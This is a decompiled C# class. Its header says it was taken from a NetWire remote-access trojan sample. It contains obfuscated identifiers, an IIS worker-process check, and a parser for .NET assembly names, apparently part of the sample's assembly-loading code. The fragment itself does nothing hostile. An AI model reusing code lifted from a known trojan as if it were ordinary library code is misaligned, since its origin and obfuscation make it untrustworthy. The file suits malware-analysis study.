// Decompiled with JetBrains decompiler
// Type: #yb.#Ib
// Assembly: u1rug, Version=0.0.0.0, Culture=neutral, PublicKeyToken=dbb94034cbd6bbd6
// MVID: C8A082E9-30A2-423A-BCDF-59565BB76FBE
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.NetWire.gen-baba76d578be903c9d78e3d6417636ba6a8069cafe9ccccdfce2bc19b43fc299.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Reflection;
using System.Text;

namespace \u0023yb
{
  internal sealed class \u0023Ib
  {
    internal const string \u0023zb = "{71461f04-2faa-4bb9-a0dd-28a79101b599}";
    private const int \u0023Ab = 4;
    internal static Dictionary<string, Assembly> \u0023Bb = new Dictionary<string, Assembly>();

    internal static bool IsWebApplication
    {
      get
      {
        try
        {
          string lower = Process.GetCurrentProcess().MainModule.ModuleName.ToLower();
          if (lower == "w3wp.exe")
            return true;
          if (lower == "aspnet_wp.exe")
            return true;
        }
        catch
        {
        }
        return false;
      }
    }

    internal struct \u0023Pb
    {
      public string \u0023Jb;
      public Version \u0023Kb;
      public string \u0023Lb;
      public string \u0023Mb;

      public string \u0023Nb(bool _param1)
      {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append(this.\u0023Jb);
        if (_param1 && this.\u0023Kb != (Version) null)
        {
          stringBuilder.Append(", Version=");
          stringBuilder.Append((object) this.\u0023Kb);
        }
        stringBuilder.Append(", Culture=");
        stringBuilder.Append(this.\u0023Lb.Length == 0 ? "neutral" : this.\u0023Lb);
        stringBuilder.Append(", PublicKeyToken=");
        stringBuilder.Append(this.\u0023Mb.Length == 0 ? "null" : this.\u0023Mb);
        return stringBuilder.ToString();
      }

      public \u0023Pb(string assemblyFullName)
      {
        this.\u0023Kb = (Version) null;
        this.\u0023Lb = string.Empty;
        this.\u0023Mb = string.Empty;
        this.\u0023Jb = string.Empty;
        string str1 = assemblyFullName;
        char[] chArray = new char[1]{ ',' };
        foreach (string str2 in str1.Split(chArray))
        {
          string str3 = str2.Trim();
          if (str3.StartsWith("Version="))
            this.\u0023Kb = new Version(str3.Substring(8));
          else if (str3.StartsWith("Culture="))
          {
            this.\u0023Lb = str3.Substring(8);
            if (this.\u0023Lb == "neutral")
              this.\u0023Lb = string.Empty;
          }
          else if (str3.StartsWith("PublicKeyToken="))
          {
            this.\u0023Mb = str3.Substring(15);
            if (this.\u0023Mb == "null")
              this.\u0023Mb = string.Empty;
          }
          else
            this.\u0023Jb = str3;
        }
      }
    }
  }
}
